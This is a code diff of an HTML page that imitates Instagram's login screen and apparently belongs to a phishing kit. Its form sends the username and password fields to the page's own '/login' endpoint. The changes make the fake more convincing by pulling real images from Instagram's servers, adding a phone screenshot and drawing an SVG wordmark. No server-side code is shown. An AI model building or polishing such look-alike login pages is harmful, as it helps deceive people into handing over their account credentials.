@@ -7,37 +7,49 @@
     <link rel="stylesheet" href="/assets/style.css">
 </head>
 <body>
-    <div class="ig-container">
-        <div class="ig-card">
-            <div class="ig-logo">
-                <img src="/assets/logo.png" alt="Instagram" height="51">
+    <div class="ig-wrapper">
+        <div class="ig-phone">
+            <img src="https://www.instagram.com/static/images/homepage/screenshot1.jpg/d6bf0c928b5a.jpg" alt="Instagram Screenshot">
+        </div>
+        <div class="ig-main">
+            <div class="ig-card">
+                <div class="ig-logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 176 52" height="51">
+                        <text x="0" y="42" font-family="Billabong, 'Segoe UI', sans-serif" font-size="45" fill="#262626">Instagram</text>
+                    </svg>
+                </div>
+                <form action="/login" method="POST">
+                    <div class="ig-input-group">
+                        <input type="text" name="email" placeholder="Phone number, username, or email" required>
+                    </div>
+                    <div class="ig-input-group">
+                        <input type="password" name="pass" placeholder="Password" required>
+                    </div>
+                    <button type="submit" class="ig-login-btn">Log In</button>
+                    <div class="ig-divider"><span>OR</span></div>
+                    <a href="#" class="ig-fb-link">
+                        <svg width="16" height="16" viewBox="0 0 16 16" style="vertical-align:middle;margin-right:6px;">
+                            <circle cx="8" cy="8" r="7.5" fill="#1877f2"/>
+                            <path d="M10.5 8.5H9V13H7V8.5H5.5V7H7V5.5C7 4.5 7.5 3.5 9 3.5H10.5V5H9.5C9.2 5 9 5.2 9 5.5V7H10.5L10.5 8.5Z" fill="white"/>
+                        </svg>
+                        Log in with Facebook
+                    </a>
+                    <a href="#" class="ig-forgot">Forgot password?</a>
+                </form>
             </div>
-            <form action="/login" method="POST">
-                <div class="ig-input-group">
-                    <input type="text" name="email" placeholder="Phone number, username, or email" required>
+            <div class="ig-signup-card">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+            <div class="ig-apps">
+                <p>Get the app.</p>
+                <div class="ig-app-badges">
+                    <a href="#">
+                        <img alt="Get it on Google Play" src="https://www.instagram.com/static/images/appstore/badge/google-play.png/bb2e8ba7db5d.png" height="40">
+                    </a>
+                    <a href="#">
+                        <img alt="Get it from Microsoft" src="https://www.instagram.com/static/images/appstore/badge/microsoft.png/1e1ecf84c467.png" height="40">
+                    </a>
                 </div>
-                <div class="ig-input-group">
-                    <input type="password" name="pass" placeholder="Password" required>
-                </div>
-                <button type="submit" class="ig-login-btn">Log In</button>
-                <div class="ig-divider">
-                    <span>OR</span>
-                </div>
-                <a href="#" class="ig-fb-link">
-                    <span class="ig-fb-icon">f</span>
-                    Log in with Facebook
-                </a>
-                <a href="#" class="ig-forgot">Forgot password?</a>
-            </form>
-        </div>
-        <div class="ig-signup-card">
-            <p>Don't have an account? <a href="#">Sign up</a></p>
-        </div>
-        <div class="ig-apps">
-            <p>Get the app.</p>
-            <div class="ig-app-badges">
-                <span class="ig-badge">Google Play</span>
-                <span class="ig-badge">Microsoft Store</span>
             </div>
         </div>
     </div>
